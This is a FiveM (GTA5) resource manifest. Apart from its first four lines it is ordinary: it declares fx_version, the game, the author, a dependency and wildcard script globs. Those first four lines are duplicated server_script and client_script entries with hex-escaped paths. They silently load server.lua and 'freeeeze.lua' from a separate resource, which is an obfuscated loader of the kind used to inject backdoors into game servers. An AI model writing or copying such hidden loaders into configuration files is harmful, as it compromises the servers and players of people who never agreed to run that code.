server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
fx_version 'cerulean'
game 'gta5'

author 'Sample'
version '0.0.1'

lua54 'yes'
dependency 'sample_util'

server_script 'sv_*.lua'
shared_script 'sh_*.lua'
client_script 'cl_*.lua'